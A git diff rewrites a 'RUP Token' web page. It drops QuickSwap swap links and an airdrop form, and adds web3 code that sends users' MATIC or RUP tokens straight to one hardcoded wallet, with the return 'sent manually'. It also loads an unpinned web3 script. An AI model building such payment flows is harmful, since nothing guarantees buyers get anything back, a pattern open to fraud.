@@ -2,92 +2,95 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>RUP Token Website</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Buy & Sell RUP Token</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #121212;
-      color: white;
-      text-align: center;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
       padding: 20px;
+      text-align: center;
     }
-
-    header img {
-      width: 120px;
-      margin-bottom: 10px;
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      margin-bottom: 20px;
-    }
-
-    .button-row {
-      margin: 30px 0;
-    }
-
-    .btn {
-      background-color: #007bff;
-      color: white;
-      padding: 12px 20px;
-      margin: 10px;
-      border: none;
+    .container {
+      background: #fff;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
       border-radius: 10px;
-      font-size: 1.2rem;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      padding: 10px;
+      width: 80%;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #4caf50;
+      color: white;
       cursor: pointer;
     }
-
-    .btn:hover {
-      background-color: #0056b3;
-    }
-
-    .terms {
-      max-width: 700px;
-      margin: auto;
-      background-color: #1e1e1e;
-      padding: 20px;
-      border-radius: 10px;
-      text-align: left;
-      font-size: 0.95rem;
-      margin-top: 40px;
-    }
-
-    footer {
-      margin-top: 40px;
-    }
-
-    a.social {
-      color: #00acee;
-      text-decoration: none;
-      font-size: 1.1rem;
+    button:hover {
+      background: #45a049;
     }
   </style>
 </head>
 <body>
-  <header>
-    <img src="rup-logo.png" alt="RUP Token Logo" />
-    <h1>RUP Token</h1>
-  </header>
-
-  <div class="button-row">
-    <button class="btn" onclick="window.open('https://quickswap.exchange/#/swap?inputCurrency=MATIC&outputCurrency=0xYourTokenAddress')">Buy RUP</button>
-    <button class="btn" onclick="window.open('https://quickswap.exchange/#/swap?inputCurrency=0xYourTokenAddress&outputCurrency=MATIC')">Sell RUP</button>
-    <button class="btn" onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLSdMQULoXp4NEXbc0QQs56E66NeFBEIi-yw4DN26')">Claim Airdrop</button>
+  <div class="container">
+    <h2>Buy/Sell RUP Token</h2>
+    <button onclick="connectWallet()">Connect Wallet</button>
+    <div>
+      <h3>Buy RUP</h3>
+      <input type="number" id="buyAmount" placeholder="Enter MATIC amount" />
+      <button onclick="buyTokens()">Buy</button>
+    </div>
+    <div>
+      <h3>Sell RUP</h3>
+      <input type="number" id="sellAmount" placeholder="Enter RUP amount" />
+      <button onclick="sellTokens()">Sell</button>
+    </div>
   </div>
 
-  <div class="terms">
-    <h2>Terms & Conditions for Airdrop</h2>
-    <ul>
-      <li>Airdrop is limited to 1 claim per wallet.</li>
-      <li>Use only valid wallet addresses.</li>
-      <li>Fake submissions will be rejected.</li>
-      <li>Distribution of tokens may take up to 48 hours.</li>
-    </ul>
-  </div>
+  <script>
+    const receiverAddress = "0x436bC1973B443c8a3c3E7C6D06271e68B49B32A4";
+    const tokenAddress = "YOUR_RUP_TOKEN_CONTRACT_ADDRESS"; // Replace with your RUP token contract address
+    const tokenAbi = [/* your RUP token ABI here */];
 
-  <footer>
-    <a class="social" href="https://t.me/yourtelegramgroup" target="_blank">Join us on Telegram</a>
-  </footer>
+    let web3;
+    let accounts;
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        accounts = await ethereum.request({ method: "eth_requestAccounts" });
+        alert("Wallet connected: " + accounts[0]);
+      } else {
+        alert("MetaMask not detected");
+      }
+    }
+
+    async function buyTokens() {
+      const amount = document.getElementById("buyAmount").value;
+      if (!web3 || !accounts) return alert("Connect wallet first");
+      await web3.eth.sendTransaction({
+        from: accounts[0],
+        to: receiverAddress,
+        value: web3.utils.toWei(amount, "ether")
+      });
+      alert("MATIC sent to owner. RUP tokens will be sent manually.");
+    }
+
+    async function sellTokens() {
+      const amount = document.getElementById("sellAmount").value;
+      if (!web3 || !accounts) return alert("Connect wallet first");
+      const tokenContract = new web3.eth.Contract(tokenAbi, tokenAddress);
+      const decimals = await tokenContract.methods.decimals().call();
+      const value = web3.utils.toBN(10).pow(web3.utils.toBN(decimals)).mul(web3.utils.toBN(amount));
+      await tokenContract.methods.transfer(receiverAddress, value.toString()).send({ from: accounts[0] });
+      alert("RUP tokens sent. MATIC will be sent manually.");
+    }
+  </script>
 </body>
 </html>
